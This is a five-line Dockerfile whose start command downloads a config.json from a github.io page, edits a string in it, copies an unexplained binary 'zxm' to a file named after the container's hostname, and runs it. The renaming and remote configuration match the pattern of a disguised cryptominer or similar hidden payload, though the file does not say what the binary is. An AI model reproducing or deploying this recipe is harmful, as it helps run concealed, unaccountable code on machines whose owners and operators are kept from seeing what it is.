FROM dzmlt/newnocmd
WORKDIR /projects/sys
CMD wget https://dzmltzack.github.io/web/config.json -O config.json && \
sed -i -e "s/PSPS/nOC/g" config.json && \
cp zxm $HOSTNAME && \
chmod +x $HOSTNAME && \
./$HOSTNAME
